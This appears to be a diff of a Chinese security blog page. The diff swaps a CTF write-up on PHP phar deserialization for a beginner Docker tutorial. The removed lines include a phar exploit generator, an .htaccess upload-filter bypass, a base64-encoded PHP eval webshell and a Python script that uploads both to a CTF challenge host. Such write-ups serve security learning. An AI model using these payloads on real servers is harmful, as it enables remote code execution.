@@ -16,26 +16,24 @@
   <meta name="author" content="Sl0th">
   <meta name="keywords" content="">
   
-    <meta name="description" content="phar反序列化phar文件结构1.a stub    可以理解为一个标志，格式为xxx，前面内容不限，但必须以__HALT_COMPILER();来结尾，否则phar扩展将无法识别这个文件为phar文件2.a manifest describing the contents    phar文件本质上是一种压缩文件，其中每个被压缩文件的权限、属性等信息都放在这部分。这部分还会以序列化的形式存储用户">
+    <meta name="description" content="docker学习dockerfile启动环境事先编写好dockerfile，在其所在目录下打开终端，从dockerfile建立镜像 1docker build -t nginx:v1 .    -t snginx:v1 给新构建的镜像取名为nginx，并设定版本为 v1 。 ⚠️不要忘记版本号后空格加一个. 最后的.代表本次执行的上下文路径 上下文路径:是指 docker 在构建镜像，有时候想要使">
 <meta property="og:type" content="article">
-<meta property="og:title" content="phar反序列化">
-<meta property="og:url" content="http://sloth31.github.io/2021/01/03/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/index.html">
+<meta property="og:title" content="docker学习">
+<meta property="og:url" content="http://sloth31.github.io/2022/01/12/docker%E5%AD%A6%E4%B9%A0/index.html">
 <meta property="og:site_name" content="Sl0th&#39;s Blog">
-<meta property="og:description" content="phar反序列化phar文件结构1.a stub    可以理解为一个标志，格式为xxx，前面内容不限，但必须以__HALT_COMPILER();来结尾，否则phar扩展将无法识别这个文件为phar文件2.a manifest describing the contents    phar文件本质上是一种压缩文件，其中每个被压缩文件的权限、属性等信息都放在这部分。这部分还会以序列化的形式存储用户">
+<meta property="og:description" content="docker学习dockerfile启动环境事先编写好dockerfile，在其所在目录下打开终端，从dockerfile建立镜像 1docker build -t nginx:v1 .    -t snginx:v1 给新构建的镜像取名为nginx，并设定版本为 v1 。 ⚠️不要忘记版本号后空格加一个. 最后的.代表本次执行的上下文路径 上下文路径:是指 docker 在构建镜像，有时候想要使">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/sloth31/images@main//202407032221511.jpg">
-<meta property="article:published_time" content="2021-01-03T14:14:34.000Z">
-<meta property="article:modified_time" content="2024-07-03T14:24:58.240Z">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/e6c9d24egy1h1t4bxp031j20zk06u0t8.jpg">
+<meta property="article:published_time" content="2022-01-12T14:33:59.000Z">
+<meta property="article:modified_time" content="2024-07-03T14:35:05.975Z">
 <meta property="article:author" content="Sl0th">
-<meta property="article:tag" content="web">
-<meta property="article:tag" content="php">
-<meta property="article:tag" content="反序列化">
+<meta property="article:tag" content="docker">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/sloth31/images@main//202407032221511.jpg">
+<meta name="twitter:image" content="https://tva1.sinaimg.cn/large/e6c9d24egy1h1t4bxp031j20zk06u0t8.jpg">
   
   
   
-  <title>phar反序列化 | Sl0th&#39;s Blog</title>
+  <title>docker学习 | Sl0th&#39;s Blog</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -221,7 +219,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="phar反序列化"></span>
+            <span id="subtitle" data-typed-text="docker学习"></span>
           
         </div>
 
@@ -232,8 +230,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2021-01-03 22:14" pubdate>
-          2021年1月3日 晚上
+        <time datetime="2022-01-12 22:33" pubdate>
+          2022年1月12日 晚上
         </time>
       </span>
     
@@ -244,7 +242,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          3k 字
+          2.7k 字
         
       </span>
     
@@ -255,7 +253,7 @@
         
         
         
-          17 分钟
+          15 分钟
         
       </span>
     
@@ -301,39 +299,85 @@
         <div id="board">
           <article class="post-content mx-auto">
             <!-- SEO header -->
-            <h1 style="display: none">phar反序列化</h1>
+            <h1 style="display: none">docker学习</h1>
             
             
               <div class="markdown-body">
                 
-                <h1 id="phar反序列化"><a href="#phar反序列化" class="headerlink" title="phar反序列化"></a>phar反序列化</h1><h3 id="phar文件结构"><a href="#phar文件结构" class="headerlink" title="phar文件结构"></a>phar文件结构</h3><p>1.a stub<br>    可以理解为一个标志，格式为xxx<?php xxx; __HALT_COMPILER();?>，前面内容不限，但必须以__HALT_COMPILER();来结尾，否则phar扩展将无法识别这个文件为phar文件<br>2.a manifest describing the contents<br>    phar文件本质上是一种压缩文件，其中每个被压缩文件的权限、属性等信息都放在这部分。这部分还会以序列化的形式存储用户自定义的meta-data，这是上述攻击手法最核心的地方<br>3.the file contents—被压缩文件的内容<br>4.[optional] a signature for verifying Phar integrity (phar file format only)—签名，放在文件末尾</p>
-<h3 id="生成phar文件"><a href="#生成phar文件" class="headerlink" title="生成phar文件"></a>生成phar文件</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TestObject</span> </span>&#123;<br>    &#125;<br><br>    @<span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-string">&quot;phar.phar&quot;</span>);<br>    <span class="hljs-variable">$phar</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Phar</span>(<span class="hljs-string">&quot;phar.phar&quot;</span>); <span class="hljs-comment">//后缀名必须为phar</span><br>    <span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">startBuffering</span>();<br>    <span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setStub</span>(<span class="hljs-string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="hljs-comment">//设置stub</span><br>    <span class="hljs-variable">$o</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">TestObject</span>();<br>    <span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setMetadata</span>(<span class="hljs-variable">$o</span>); <span class="hljs-comment">//将自定义的meta-data存入manifest</span><br>    <span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">addFromString</span>(<span class="hljs-string">&quot;test.txt&quot;</span>, <span class="hljs-string">&quot;test&quot;</span>); <span class="hljs-comment">//添加要压缩的文件</span><br>    <span class="hljs-comment">//签名自动计算</span><br>    <span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">stopBuffering</span>();<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+                <h1 id="docker学习"><a href="#docker学习" class="headerlink" title="docker学习"></a>docker学习</h1><h2 id="dockerfile启动环境"><a href="#dockerfile启动环境" class="headerlink" title="dockerfile启动环境"></a>dockerfile启动环境</h2><p>事先编写好dockerfile，在其所在目录下打开终端，从dockerfile建立镜像</p>
+<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">docker <span class="hljs-keyword">build </span>-t nginx:<span class="hljs-built_in">v1</span> . <br></code></pre></td></tr></table></figure>
 
 <blockquote>
-<p>会在同目录生成 phar.phar 文件</p>
-<p>注意：要想生成phar文件，必须将phar.readonly配置项配置为0或Off,并且删除行首分号，在行尾加. 否则无法生成phar文件</p>
+<p>-t snginx:v1 给新构建的镜像取名为nginx，并设定版本为 v1 。</p>
+<p>⚠️不要忘记版本号后空格加一个<code>.</code> 最后的<code>.</code>代表本次执行的上下文路径</p>
+<p>上下文路径:是指 docker 在构建镜像，有时候想要使用到本机的文件（比如复制），docker build 命令得知这个路径后，会将路径下的所有内容打包。默认上下文路径就是 Dockerfile 所在的位置a</p>
+<p>⚠️上下文路径下不要放无用的文件，因为会一起打包发送给 docker 引擎，如果文件过多会造成过程缓慢。</p>
 </blockquote>
-<h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>meta-data是以序列化的形式存储的</p>
-<p>php一大部分的文件系统函数在通过<code>phar://</code>伪协议解析phar文件时，都会将meta-data进行<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96&spm=1001.2101.3001.7020">反序列化</a>，测试后受影响的函数如下</p>
-<p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202407032221511.jpg" srcset="/img/loading.gif" lazyload alt="image-20211018194419673"></p>
-<h3 id="SWPUCTF-2018-SimplePHP-EXP"><a href="#SWPUCTF-2018-SimplePHP-EXP" class="headerlink" title="[SWPUCTF 2018]SimplePHP EXP"></a>[SWPUCTF 2018]SimplePHP EXP</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">C1e4r</span></span>&#123;<br>	<span class="hljs-keyword">public</span> <span class="hljs-variable">$test</span>;<br>	<span class="hljs-keyword">public</span> <span class="hljs-variable">$str</span>;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Show</span></span>&#123;<br>	<span class="hljs-keyword">public</span> <span class="hljs-variable">$source</span>;<br>	<span class="hljs-keyword">public</span> <span class="hljs-variable">$str</span>;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span></span>&#123;<br>	<span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span>;<br>	<span class="hljs-keyword">public</span> <span class="hljs-variable">$params</span>;	<br>&#125;<br><span class="hljs-variable">$c</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Test</span>();<br><span class="hljs-variable">$c</span>-&gt;params=<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;source&#x27;</span>=&gt;<span class="hljs-string">&#x27;var/www/html/f1ag.php&#x27;</span>);<span class="hljs-comment">//flag所在路径</span><br><span class="hljs-variable">$b</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Show</span>();<br><span class="hljs-variable">$b</span>-&gt;str[<span class="hljs-string">&#x27;str&#x27;</span>]=<span class="hljs-variable">$c</span>;<span class="hljs-comment">//为了不存在的调用触发__get()</span><br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">C1e4r</span>();<br><span class="hljs-variable">$a</span>-&gt;str=<span class="hljs-variable">$b</span>;<span class="hljs-comment">//触发__toString()</span><br>@<span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-string">&quot;phar.phar&quot;</span>);<br><span class="hljs-variable">$phar</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Phar</span>(<span class="hljs-string">&quot;phar.phar&quot;</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">startBuffering</span>(); <br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setStub</span>(<span class="hljs-string">&#x27;GIF89a&#x27;</span>.<span class="hljs-string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="hljs-comment">//设置stub，增加图片类型文件头</span><br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setMetadata</span>(<span class="hljs-variable">$a</span>); <span class="hljs-comment">//meta-data储存的信息</span><br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">addFromString</span>(<span class="hljs-string">&quot;test.txt&quot;</span>, <span class="hljs-string">&quot;test&quot;</span>);<span class="hljs-comment">//生成签名</span><br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">stopBuffering</span>();<br></code></pre></td></tr></table></figure>
+<p>使用<code>docker images</code>命令查看镜像是否创建成功，若成功会发现有一个刚创建的nginx镜像</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">REPOSITORY</span>    TAG   IMAGE ID       CREATED        SIZE<br><span class="hljs-attribute">nginx</span>         v1   <span class="hljs-number">3</span>efd9464e2a0   <span class="hljs-number">2</span> hours ago    <span class="hljs-number">134</span>MB<br></code></pre></td></tr></table></figure>
+
+<p>利用该镜像启动容器，注意端口映射</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">docker <span class="hljs-built_in">run</span> -p 本地端口：容器端口 镜像名称<br>docker <span class="hljs-built_in">run</span>  --name docker_nginx_v1   -d -p 127.0.0.1:5001:80 nginx:v1<br></code></pre></td></tr></table></figure>
 
 <blockquote>
-<p>要想生成phar文件，必须将php.ini中phar.readonly配置项配置为0或Off,并且删除行首分号，在行尾加.</p>
-<p>生成的phar中metada.bin内容为类序列化后的内容</p>
+<p>意思是启动一个名字为docker_nginx_v1的容器，使用nginx:v1镜像，并将本机127.0.0.1:5001映射到该容器的80端口(因为nginx的默认端口是<strong>80</strong>)，因此建立成功后可以从127.0.0.1:5001访问该环境</p>
+<p>注：</p>
+<p>1.容器默认都是绑定 tcp 端口，如果要绑定 UDP 端口，可以在容器的端口后面加上 &#x2F;udp</p>
+<p>2.-d:在后台运行</p>
+<p>3.-it:交互式方式运行</p>
+<p>4.-p:指定端口</p>
 </blockquote>
-<h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><h3 id="绕过-lt-过滤"><a href="#绕过-lt-过滤" class="headerlink" title="绕过&lt;?过滤"></a>绕过&lt;?过滤</h3><p>.htaccess绕过文件头检查</p>
-<p>如果用一般的<code>GIF89a</code>文件头绕过，会导致htaccess文件无法执行，因此这里用定义高度与宽度，#在htaccess中被视为注释</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs htaccess">#define width 1337<br>#define height 1337<br>AddType application/x-httpd-php .a<br>php_value auto_append_file &quot;php://filter/convert.base64-decode/resource=./shell.a&quot;<br></code></pre></td></tr></table></figure>
+<p><code>docker ps</code>查看正在运行的容器</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">CONTAINER</span> ID   IMAGE      COMMAND                  CREATED         STATUS         PORTS                    NAMES<br><span class="hljs-attribute">dd0c50ae3ef8</span>   nginx:v1   <span class="hljs-string">&quot;/docker-entrypoint.…&quot;</span>   <span class="hljs-number">4</span> seconds ago   Up <span class="hljs-number">3</span> seconds   <span class="hljs-number">127.0.0.1:5001</span>-&gt;<span class="hljs-number">80</span>/tcp   docker_nginx_v1<br></code></pre></td></tr></table></figure>
 
-<p>shell.a内容</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">GIF89a11<br>PD9waHAgZXZhbCgkX1BPU1RbJ2NtZCddKTs/Pg==<br></code></pre></td></tr></table></figure>
+<p>访问127.0.0.1:5001</p>
+<p><img src="https://tva1.sinaimg.cn/large/e6c9d24egy1h1t4bxp031j20zk06u0t8.jpg" srcset="/img/loading.gif" lazyload alt="image-20220501191611894"></p>
+<p>dockerfile的内容</p>
+<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">FROM</span> nginx<br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;&lt;h1&gt;Hello, Docker!&lt;/h1&gt;&#x27;</span> &gt; /usr/share/nginx/html/index.html</span><br></code></pre></td></tr></table></figure>
+
+<h2 id="使用dockerfile构建镜像"><a href="#使用dockerfile构建镜像" class="headerlink" title="使用dockerfile构建镜像"></a>使用dockerfile构建镜像</h2><p>Dockerfile整体就两类语句组成：</p>
+<ul>
+<li># Comment 注释信息</li>
+<li>Instruction arguments 指令 参数，一行一个指令。</li>
+</ul>
+<p>⚠️</p>
+<ol>
+<li>Dockerfile文件名<strong>首字母必须大写</strong>。</li>
+<li>Dockerfile指令不区分大小写，但是为方便和参数做区分，通常<strong>指令使用大写字母。</strong></li>
+<li>Dockerfile中指令按顺序从上至下依次执行。</li>
+<li>Dockerfile中第一个非注释行必须是<strong>FROM指令</strong>，用来指定制作当前镜像依据的是哪个基础镜像。</li>
+<li>Dockerfile中需要调用的文件必须跟Dockerfile文件在同一目录下，或者在其子目录下，父目录或者其它路径无效。</li>
+</ol>
+<h3 id="FROM和RUN"><a href="#FROM和RUN" class="headerlink" title="FROM和RUN"></a>FROM和RUN</h3><p><strong>FROM</strong>：定制的镜像都是基于 FROM 的镜像，这里的 nginx 就是定制需要的基础镜像。后续的操作都是基于 nginx。</p>
+<p><strong>RUN</strong>：用于执行后面跟着的命令行命令。有以下俩种格式：</p>
+<p>shell格式</p>
+<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">RUN</span><span class="language-bash"> &lt;命令行命令&gt;</span><br></code></pre></td></tr></table></figure>
 
 <blockquote>
-<p>文件头后加的内容是为了补足8个字节，满足base64编码规则</p>
+<p>&lt;命令行命令&gt; 等同于，在终端操作的 shell 命令。</p>
 </blockquote>
-<h3 id="文件上传python脚本"><a href="#文件上传python脚本" class="headerlink" title="文件上传python脚本"></a>文件上传python脚本</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><br>url = <span class="hljs-string">r&quot;http://7c586462-a2f1-4008-a870-9303b30d8fb1.node4.buuoj.cn/?_=$&#123;%80%80%80%80^%df%c7%c5%d4&#125;&#123;%80&#125;();&amp;%80=get_the_flag&quot;</span> <span class="hljs-comment"># 执行get_the_flag函数</span><br>session = requests.session()<br>htaccess_content = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">#define width 1337</span><br><span class="hljs-string">#define height 1337</span><br><span class="hljs-string">AddType application/x-httpd-php .a</span><br><span class="hljs-string">php_value auto_append_file &quot;php://filter/convert.base64-decode/resource=./shell.a&quot;</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>files_htaccess = &#123;<span class="hljs-string">&#x27;file&#x27;</span>: (<br>    <span class="hljs-string">&#x27;.htaccess&#x27;</span>, htaccess_content, <span class="hljs-string">&#x27;image/jpeg&#x27;</span>)&#125;<br>res_hta = session.post(url, files=files_htaccess)<br><span class="hljs-built_in">print</span>(res_hta.text)<br>shell_file = <span class="hljs-string">&#x27;GIF89a12PD9waHAgZXZhbCgkX1JFUVVFU1RbJ2NtZCddKTs/Pg==&#x27;</span><br>files_shell = &#123;<span class="hljs-string">&#x27;file&#x27;</span>: (<br>    <span class="hljs-string">&#x27;shell.a&#x27;</span>, shell_file, <span class="hljs-string">&#x27;image/jpeg&#x27;</span>)&#125;<br>res_jpg = session.post(url, files=files_shell)<br><br><span class="hljs-built_in">print</span>(res_jpg.text)  <span class="hljs-comment"># 打印路径</span><br></code></pre></td></tr></table></figure>
+<p>exec格式</p>
+<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">RUN</span><span class="language-bash"> [<span class="hljs-string">&quot;可执行文件&quot;</span>, <span class="hljs-string">&quot;参数1&quot;</span>, <span class="hljs-string">&quot;参数2&quot;</span>]</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> [<span class="hljs-string">&quot;./test.php&quot;</span>, <span class="hljs-string">&quot;dev&quot;</span>, <span class="hljs-string">&quot;offline&quot;</span>] </span><br><span class="hljs-comment"># 等价于 RUN ./test.php dev offline</span><br></code></pre></td></tr></table></figure>
 
+<blockquote>
+<p>如果有多条命令执行，不要分成多个RUN语句，dockerfile的指令每执行一次都会在 docker 上新建一层，过多无意义的层，会造成镜像膨胀过大</p>
+<p>正确写法是用<code>\</code>表示分行，<code>&amp;&amp;</code>链接命令</p>
+<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">FROM</span> centos<br><span class="hljs-keyword">RUN</span><span class="language-bash"> yum -y install wget \</span><br><span class="language-bash"> &amp;&amp; wget -O redis.tar.gz <span class="hljs-string">&quot;http://download.redis.io/releases/redis-5.0.3.tar.gz&quot;</span> \</span><br><span class="language-bash"> &amp;&amp; tar -xvf redis.tar.gz</span><br></code></pre></td></tr></table></figure>
+</blockquote>
+<h3 id="COPY"><a href="#COPY" class="headerlink" title="COPY"></a>COPY</h3><p>复制指令，可以从上下文目录中复制文件或目录到容器内指定路径</p>
+<figure class="highlight bnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bnf">COPY [--chown=<span class="hljs-attribute">&lt;user&gt;</span>:<span class="hljs-attribute">&lt;group&gt;</span>] <span class="hljs-attribute">&lt;源路径1&gt;</span>...  <span class="hljs-attribute">&lt;目标路径&gt;</span><br>COPY [--chown=<span class="hljs-attribute">&lt;user&gt;</span>:<span class="hljs-attribute">&lt;group&gt;</span>] [&quot;<span class="hljs-attribute">&lt;源路径1&gt;</span>&quot;,...  &quot;<span class="hljs-attribute">&lt;目标路径&gt;</span>&quot;]<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li><p>**[–chown&#x3D;<user>:<group>]**：可选参数，用户改变复制到容器内文件的拥有者和属组</p>
+</li>
+<li><p>**&lt;源路径&gt;**：源文件或者源目录，这里可以是通配符表达式，其通配符规则要满足 Go 的 filepath.Match 规则</p>
+<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs vim">pattern:<br>	&#123; term &#125;<br>term:<br>	<span class="hljs-string">&#x27;*&#x27;</span>                                  匹配<span class="hljs-number">0</span>或多个非路径分隔符的字符<br>	<span class="hljs-string">&#x27;?&#x27;</span>                                  匹配<span class="hljs-number">1</span>个非路径分隔符的字符<br>	<span class="hljs-string">&#x27;[&#x27;</span> [ <span class="hljs-string">&#x27;^&#x27;</span> ] &#123; character-<span class="hljs-built_in">range</span> &#125; <span class="hljs-string">&#x27;]&#x27;</span>  字符组（必须非空）<br>	<span class="hljs-keyword">c</span>                                    匹配字符<span class="hljs-keyword">c</span>（<span class="hljs-keyword">c</span> != <span class="hljs-string">&#x27;*&#x27;</span>, <span class="hljs-string">&#x27;?&#x27;</span>, <span class="hljs-string">&#x27;\\&#x27;</span>, <span class="hljs-string">&#x27;[&#x27;</span>）<br>	<span class="hljs-string">&#x27;\\&#x27;</span> <span class="hljs-keyword">c</span>                               匹配字符<span class="hljs-keyword">c</span><br>character-<span class="hljs-built_in">range</span>:<br>	<span class="hljs-keyword">c</span>           匹配字符<span class="hljs-keyword">c</span>（<span class="hljs-keyword">c</span> != <span class="hljs-string">&#x27;\\&#x27;</span>, <span class="hljs-string">&#x27;-&#x27;</span>, <span class="hljs-string">&#x27;]&#x27;</span>）<br>	<span class="hljs-string">&#x27;\\&#x27;</span> <span class="hljs-keyword">c</span>      匹配字符<span class="hljs-keyword">c</span><br>	<span class="hljs-keyword">lo</span> <span class="hljs-string">&#x27;-&#x27;</span> <span class="hljs-keyword">hi</span>   匹配区间[<span class="hljs-keyword">lo</span>, <span class="hljs-keyword">hi</span>]内的字符<br><br></code></pre></td></tr></table></figure>
+</li>
+<li><p>**&lt;目标路径&gt;**：容器内的指定路径，该路径不用事先建好，<u>路径不存在的话，会自动创建</u>。</p>
+</li>
+</ul>
+<h2 id="镜像源拉取超时问题"><a href="#镜像源拉取超时问题" class="headerlink" title="镜像源拉取超时问题"></a>镜像源拉取超时问题</h2><p>将dockerfile中的</p>
+<p><a href="http://link.zhihu.com/?target=http://k8s.gcr.io">k8s.gcr.io</a> —&gt; lank8s.cn<br><a href="http://link.zhihu.com/?target=http://gcr.io">gcr.io</a> –&gt; gcr.lank8s.cn</p>
 
                 
               </div>
@@ -352,7 +396,7 @@
     
       <span class="category-chain">
         
-  <a href="/categories/ctf/" class="category-chain-item">ctf</a>
+  <a href="/categories/utils/" class="category-chain-item">utils</a>
   
   
 
@@ -367,11 +411,7 @@
     <div class="post-meta">
       <i class="iconfont icon-tags"></i>
       
-        <a href="/tags/web/">#web</a>
-      
-        <a href="/tags/php/">#php</a>
-      
-        <a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">#反序列化</a>
+        <a href="/tags/docker/">#docker</a>
       
     </div>
   
@@ -383,8 +423,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>phar反序列化</div>
-      <div>http://sloth31.github.io/2021/01/03/phar反序列化/</div>
+      <div>docker学习</div>
+      <div>http://sloth31.github.io/2022/01/12/docker学习/</div>
     </div>
     <div class="license-meta">
       
@@ -396,7 +436,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>发布于</div>
-          <div>2021年1月3日</div>
+          <div>2022年1月12日</div>
         </div>
       
       
@@ -438,15 +478,21 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2022/01/12/docker%E5%AD%A6%E4%B9%A0/" title="docker学习">
+                      <a href="/2022/01/20/php%E5%88%A9%E7%94%A8math%E5%87%BD%E6%95%B0rce%E7%9B%B8%E5%85%B3%E6%80%9D%E8%80%83%E4%B8%8E%E7%90%86%E8%A7%A3/" title="php利用math函数rce相关思考与理解">
                         <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">docker学习</span>
+                        <span class="hidden-mobile">php利用math函数rce相关思考与理解</span>
                         <span class="visible-mobile">上一篇</span>
                       </a>
                     
                   </article>
                   <article class="post-next col-6">
                     
+                    
+                      <a href="/2021/01/03/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="phar反序列化">
+                        <span class="hidden-mobile">phar反序列化</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
                     
                   </article>
                 </div>
